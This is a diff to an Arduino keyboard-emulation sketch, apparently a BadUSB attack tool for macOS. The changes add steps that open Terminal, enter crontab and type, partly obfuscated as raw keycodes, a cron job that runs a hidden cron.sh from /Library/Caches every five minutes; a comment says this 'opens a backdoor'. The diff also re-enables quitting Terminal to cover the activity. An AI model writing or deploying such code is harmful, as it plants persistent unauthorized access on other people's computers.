@@ -30,6 +30,7 @@ void setup()
   // now open Terminal and open new Terminal tab
   openapp("termi");
   cmd(116); // cmd + t
+  delay(500);
   
   // Create a cron which opens a backdoor
 
@@ -84,12 +85,19 @@ void setup()
   writeandsave();
 
   // Create a cron task to execute cron.sh every 5 minutes
+  // typeln("crontab -e");
   Keyboard.print("crontab "); Keyboard.write(47); typeln("e");
-
+  // Insert mode
+  Keyboard.print("i");
+  // typeln("*/5 * * * * cd /Library/Caches && sh cron.sh > /Library/Caches/cron.log 2>&1");
+  Keyboard.write(125); shift(55); Keyboard.print("5 ");
+  Keyboard.write(125); Keyboard.print(" "); Keyboard.write(125); Keyboard.print(" "); Keyboard.write(125); Keyboard.print(" "); Keyboard.write(125); Keyboard.print(" cd ");
+  typefolderroute(); Keyboard.print(" "); Keyboard.write(94); Keyboard.write(94); typeln(" sh cron.sh");
+  
   writeandsave();
   
   // Close terminal window
-  // cmd(113); // cmd + q
+  cmd(113); // cmd + q
 }
 
 void writeandsave(){
@@ -143,7 +151,7 @@ void typeln(String chars)
   Keyboard.print(chars);
   // delay(50);
   Keyboard.write(176);
-  delay(200);
+  delay(250);
 }
 
 void loop()
